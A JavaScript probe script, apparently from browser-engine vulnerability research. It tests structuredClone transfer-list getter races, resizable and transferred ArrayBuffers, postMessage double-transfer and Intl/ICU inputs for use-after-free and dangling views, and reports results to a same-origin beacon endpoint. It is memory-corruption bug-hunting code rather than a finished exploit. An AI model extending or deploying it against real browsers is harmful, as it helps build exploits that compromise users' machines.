/* p68-xfer-race — Transfer-list getter race escalation
 * DS analysis: structuredClone serializer walks object graph, calling getters.
 * If a getter resizes/detaches a buffer that's ALSO in the transfer list,
 * the serializer may snapshot length before/after the getter → size mismatch → UAF.
 * Also tests: postMessage transfer races, double-transfer, ArrayBuffer.transfer.
 * Beacon prefix: V68X-
 */
(function(){
"use strict";
var RUN_ID = "v68x" + Math.random().toString(36).slice(2,12);
var PREFIX = "V68X-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,600)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press68-transfer-list getter race");

/* ====== T1: Getter resizes RAB in transfer list during structuredClone ====== */
function test1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(64, { maxByteLength: 1024 });
    var view = new Uint8Array(rab);
    for (var i = 0; i < 64; i++) view[i] = 0xAA;

    var triggerCount = 0;
    var obj = {};
    Object.defineProperty(obj, 'a', { enumerable: true, get: function() {
      triggerCount++;
      try { rab.resize(512); } catch(e) { r.resizeErr = e.message.slice(0,40); }
      return 42;
    }});
    obj.buf = new Uint8Array(rab).buffer; // snapshot? or live ref?
    // Actually put the RAB view in the object too
    Object.defineProperty(obj, 'b', { enumerable: true, get: function() {
      triggerCount++;
      return new Uint8Array(rab).slice(); // force read during serialization
    }});

    try {
      var cloned = structuredClone(obj, { transfer: [rab] });
      r.cloneOK = true;
      r.triggers = triggerCount;
      r.clonedA = cloned.a;
      r.clonedBufLen = cloned.buf ? cloned.buf.byteLength : "none";
      r.clonedBLen = cloned.b ? cloned.b.length || cloned.b.byteLength : "none";
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
      r.triggers = triggerCount;
    }
    try { r.rabLen = rab.byteLength; } catch(e) { r.rabLen = "DETACHED"; }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T1-RESIZE-XFER", r);
}

/* ====== T2: Getter detaches buffer that's in transfer list ====== */
function test2() {
  var r = {};
  try {
    var buf1 = new ArrayBuffer(128);
    var u8 = new Uint8Array(buf1);
    for (var i = 0; i < 128; i++) u8[i] = i;

    var buf2 = new ArrayBuffer(64);

    var triggerCount = 0;
    var obj = {};
    Object.defineProperty(obj, 'x', { enumerable: true, get: function() {
      triggerCount++;
      // Try to transfer buf1 away via MessageChannel DURING serialization
      try {
        var mc = new MessageChannel();
        mc.port1.postMessage(buf1, [buf1]);
        r.innerXfer = true;
      } catch(e) {
        r.innerXfer = false;
        r.innerErr = e.message.slice(0,40);
      }
      return 99;
    }});
    obj.data = buf2;

    // buf1 is in BOTH the getter's transfer AND the outer transfer list
    try {
      var cloned = structuredClone(obj, { transfer: [buf1] });
      r.cloneOK = true;
      r.triggers = triggerCount;
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
      r.triggers = triggerCount;
    }
    try { r.buf1Len = buf1.byteLength; } catch(e) { r.buf1Len = "DETACHED"; }
    try { r.buf2Len = buf2.byteLength; } catch(e) { r.buf2Len = "DETACHED"; }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T2-DETACH-RACE", r);
}

/* ====== T3: ArrayBuffer.transfer + view invalidation ====== */
function test3() {
  var r = {};
  try {
    // Test if ArrayBuffer.transfer exists and if views are invalidated
    if (typeof ArrayBuffer.prototype.transfer !== 'function') {
      r.hasTransfer = false;
      B("T3-AB-TRANSFER", r);
      return;
    }
    r.hasTransfer = true;

    var buf = new ArrayBuffer(256);
    var dv = new DataView(buf, 0, 128);
    var u32 = new Uint32Array(buf, 0, 32);
    dv.setUint32(0, 0xDEADFACE);
    u32[1] = 0xBEEFCAFE;

    // Transfer the buffer
    var newBuf = buf.transfer(256);
    r.newBufLen = newBuf.byteLength;
    try { r.oldBufLen = buf.byteLength; } catch(e) { r.oldBufLen = "DETACHED"; }

    // Check if old views are invalidated
    try {
      var val = dv.getUint32(0);
      r.DV_DANGLING = true;
      r.dvVal = "0x" + val.toString(16);
    } catch(e) {
      r.DV_DANGLING = false;
      r.dvErr = e.name;
    }

    try {
      var val2 = u32[0];
      r.TA_DANGLING = true;
      r.taVal = "0x" + val2.toString(16);
    } catch(e) {
      r.TA_DANGLING = false;
    }

    // Transfer to a SMALLER size — does data survive in freed region?
    var buf2 = new ArrayBuffer(256);
    var dv2 = new DataView(buf2, 128, 64); // view into second half
    dv2.setUint32(0, 0x13371337);
    var smallBuf = buf2.transfer(64); // shrink! second half freed
    r.shrunkLen = smallBuf.byteLength;

    try {
      var shrunkVal = dv2.getUint32(0);
      r.SHRINK_DANGLING = true; // view into freed region still reads!
      r.shrinkVal = "0x" + shrunkVal.toString(16);
    } catch(e) {
      r.SHRINK_DANGLING = false;
    }

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T3-AB-TRANSFER", r);
}

/* ====== T4: RAB resize + ArrayBuffer.transfer combo ====== */
function test4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(64, { maxByteLength: 512 });
    var v1 = new Uint8Array(rab); // length-tracking view
    var v2 = new DataView(rab, 0, 64); // fixed-length view
    v2.setUint32(0, 0xAAAAAAAA);

    // Clone v2 to get odd DataView
    var oddDV;
    try { oddDV = structuredClone(v2); } catch(e) {
      r.cloneErr = e.message;
      B("T4-RAB-COMBO", r);
      return;
    }
    r.oddCreated = true;
    r.oddIsDV = oddDV instanceof DataView;

    // Now: resize rab, then transfer rab
    rab.resize(256);
    r.resized = rab.byteLength;

    // v1 should track (length-tracking)
    r.v1Len = v1.length; // should be 256
    // v2 should stay fixed
    try { r.v2Len = v2.byteLength; } catch(e) { r.v2Len = "ERR"; }

    // Transfer rab
    if (typeof rab.transfer === 'function') {
      var newRab = rab.transfer();
      r.xferred = true;
      try { r.rabDetached = rab.byteLength; } catch(e) { r.rabDetached = "DETACHED"; }

      // v1 (length-tracking) should be detached
      try { r.v1After = v1.length; r.V1_DANGLING = r.v1After > 0; } catch(e) { r.v1After = "ERR"; }
      // v2 (fixed) should be detached
      try { var x = v2.getUint32(0); r.V2_DANGLING = true; r.v2Val = "0x" + x.toString(16); } catch(e) { r.V2_DANGLING = false; }

      // oddDV — independent clone, should still work
      try { r.oddVal = "0x" + oddDV.getUint32(0).toString(16); } catch(e) { r.oddVal = "ERR"; }
    } else {
      // Use structuredClone transfer
      try {
        structuredClone(rab, { transfer: [rab] });
        r.scXferred = true;
        try { r.rabDetached = rab.byteLength; } catch(e) { r.rabDetached = "DETACHED"; }
        try { var y = v2.getUint32(0); r.V2_DANGLING = true; r.v2Val = "0x" + y.toString(16); } catch(e) { r.V2_DANGLING = false; }
      } catch(e) { r.scXferErr = e.message.slice(0,60); }
    }

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T4-RAB-COMBO", r);
}

/* ====== T5: postMessage double-transfer race ====== */
function test5() {
  var r = {};
  try {
    var buf = new ArrayBuffer(128);
    var u8 = new Uint8Array(buf);
    for (var i = 0; i < 128; i++) u8[i] = 0xDD;

    var mc1 = new MessageChannel();
    var mc2 = new MessageChannel();

    // Try to transfer same buffer to BOTH ports simultaneously
    try {
      mc1.port1.postMessage(buf, [buf]);
      r.xfer1 = true;
    } catch(e) {
      r.xfer1 = false;
      r.err1 = e.message.slice(0,40);
    }
    try {
      mc2.port1.postMessage(buf, [buf]);
      r.xfer2 = true; // DOUBLE TRANSFER BUG!
    } catch(e) {
      r.xfer2 = false;
      r.err2 = e.message.slice(0,40);
    }
    try { r.bufLen = buf.byteLength; } catch(e) { r.bufLen = "DETACHED"; }

    // Check what each port received
    mc1.port2.onmessage = function(e) {
      r.port1Got = e.data ? e.data.byteLength : "null";
      B("T5-DBLXFER-P1", r);
    };
    mc2.port2.onmessage = function(e) {
      r.port2Got = e.data ? e.data.byteLength : "null";
      B("T5-DBLXFER-P2", r);
    };

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T5-DBLXFER", r);
}

/* ====== T6: structuredClone with DV in graph + buffer in transfer ====== */
function test6() {
  var r = {};
  try {
    var buf = new ArrayBuffer(64);
    var dv = new DataView(buf, 8, 32);
    dv.setUint32(0, 0xFACEFACE);

    // Clone an object containing the DV, with its buffer in transfer list
    // Spec: transferring the buffer should detach it, making the DV in the
    // clone graph reference a detached buffer → what does JSC do?
    var obj = { view: dv, extra: "hello" };
    try {
      var cloned = structuredClone(obj, { transfer: [buf] });
      r.cloneOK = true;
      // Does the cloned view work?
      try {
        r.clonedVal = "0x" + cloned.view.getUint32(0).toString(16);
        r.clonedViewOK = true;
      } catch(e) {
        r.clonedViewOK = false;
        r.clonedViewErr = e.message.slice(0,40);
      }
      r.clonedExtra = cloned.extra;
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }

    // Original buffer should be detached
    try { r.origBufLen = buf.byteLength; } catch(e) { r.origBufLen = "DETACHED"; }
    // Original DV should be detached
    try { var v = dv.getUint32(0); r.origDV = "0x" + v.toString(16); } catch(e) { r.origDV = "DETACHED:" + e.name; }

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T6-DV-BUF-XFER", r);
}

/* ====== T7: Odd DV's buffer in transfer list of structuredClone ====== */
function test7() {
  var r = {};
  try {
    var buf = new ArrayBuffer(64);
    var dv = new DataView(buf, 0, 32);
    dv.setUint32(0, 0x11223344);

    // Get odd DV
    var oddDV = structuredClone(dv);
    r.oddIsDV = oddDV instanceof DataView;
    var oddBuf = oddDV.buffer;

    // Put odd DV in an object graph, with its buffer in transfer list
    var obj = { oddView: oddDV, marker: "test7" };
    try {
      var cloned = structuredClone(obj, { transfer: [oddBuf] });
      r.cloneOK = true;
      try {
        r.reclonedVal = "0x" + cloned.oddView.getUint32(0).toString(16);
        r.reclonedIsDV = cloned.oddView instanceof DataView;
      } catch(e) {
        r.reclonedErr = e.message.slice(0,40);
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }

    // Check odd DV after its buffer was transferred
    try { r.oddBufLen = oddBuf.byteLength; } catch(e) { r.oddBufLen = "DETACHED"; }
    try {
      var postVal = oddDV.getUint32(0);
      r.ODD_DANGLING = true;
      r.postVal = "0x" + postVal.toString(16);
    } catch(e) {
      r.ODD_DANGLING = false;
      r.postErr = e.name;
    }

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T7-ODD-GRAPH-XFER", r);
}

/* ====== T8: Intl string fuzzing (ICU attack surface) ====== */
function test8() {
  var r = {};
  try {
    // Segmenter with huge string
    if (typeof Intl.Segmenter === 'function') {
      var seg = new Intl.Segmenter('en', { granularity: 'grapheme' });
      // 100KB string of mixed scripts + emoji + ZWJ sequences
      var bigStr = "";
      for (var i = 0; i < 5000; i++) {
        bigStr += String.fromCodePoint(0x1F468, 0x200D, 0x1F469, 0x200D, 0x1F467, 0x200D, 0x1F466);
      }
      var t0 = performance.now();
      var count = 0;
      try {
        var iter = seg.segment(bigStr);
        for (var s of iter) { count++; if (count > 50000) break; }
      } catch(e) { r.segErr = e.message.slice(0,40); }
      r.segTime = (performance.now() - t0).toFixed(1) + "ms";
      r.segCount = count;
      r.segOK = true;
    } else { r.segOK = false; }

    // Locale parsing with crafted tags
    var locales = [
      "en-u-ca-buddhist-nu-thai-kf-upper-kn-true-co-eor",
      "und-Zyyy-ZZ-fonipa-a-myext-x-private",
      "zh-Hans-CN-u-" + "a".repeat(200),
      "en-u-" + Array(50).fill("ca-gregory").join("-"),
    ];
    r.localeResults = [];
    for (var j = 0; j < locales.length; j++) {
      try {
        var l = new Intl.Locale(locales[j]);
        r.localeResults.push({ i: j, lang: l.language, ok: true });
      } catch(e) {
        r.localeResults.push({ i: j, err: e.message.slice(0,30) });
      }
    }

    // DisplayNames with crafted codes
    try {
      var dn = new Intl.DisplayNames('en', { type: 'region' });
      r.dnNormal = dn.of('US');
      try { r.dnWeird = dn.of('ZZ'); } catch(e) { r.dnWeird = "ERR"; }
      try { r.dnEmpty = dn.of(''); } catch(e) { r.dnEmpty = "ERR"; }
    } catch(e) { r.dnFatal = e.message.slice(0,40); }

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T8-INTL-FUZZ", r);
}

/* ====== Run ====== */
try {
  test1();
  setTimeout(test2, 200);
  setTimeout(test3, 400);
  setTimeout(test4, 600);
  setTimeout(test5, 800);
  setTimeout(test6, 1000);
  setTimeout(test7, 1200);
  setTimeout(test8, 1400);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe68-done"); }, 14000);
})();
